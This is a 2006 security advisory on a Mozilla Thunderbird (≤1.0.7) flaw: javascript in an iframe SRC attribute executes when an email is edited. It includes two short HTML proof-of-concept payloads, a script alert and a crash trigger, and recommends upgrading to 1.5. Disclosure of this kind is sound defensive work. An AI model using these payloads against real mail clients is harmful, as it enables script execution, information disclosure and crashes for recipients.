Mozilla Thunderbird : Remote Code Execution & Denial of Service

//----- Advisory


Program          : Mozilla Thunderbird
Homepage         : http://www.mozilla.com/thunderbird/
Tested version   : <= 1.0.7
Found by         : nono2357 at sysdream dot com
This advisory    : nono2357 at sysdream dot com
Discovery date   : 2006/01/28


//----- Application description


Full-Featured Email

Simple to use, powerful, and customizable, Thunderbird is a full-featured
email application. Thunderbird supports IMAP and POP mail protocols, as well
as HTML mail formatting. Easily import your existing email accounts and
messages. Built-in RSS capabilities, powerful quick search, spell check
as you
type, global inbox, deleting attachments and advanced message filtering
round
out Thunderbird's modern feature set.


//----- Description of vulnerability


Thunderbird's WYSIWYG rendering engine insufficiently filters javascript
scripts. It is possible to write javascript in the SRC attribute of the
IFRAME
tag. This leads to execution when the email is edited (for instance when
replying to the email), even if javascript is disabled in the preferences.


//----- Proof Of Concept


* Javascript execution :

<html>
<body>
<iframe src="javascript:alert('Found by www.sysdream.com !')"></iframe>
</body>
</html>

* Denial of service (application crash) :

<html>
<body>
<iframe src="javascript:parent.document.write('Found by www.sysdream.com
!')"></iframe>
</body>
</html>


//----- Solution


Upgrade to version 1.5.

Direct link :

//----- Impact


Successful exploitation may lead to information disclosure (application
version, platform, user emails, user preferences, ...) or could crash the
application.
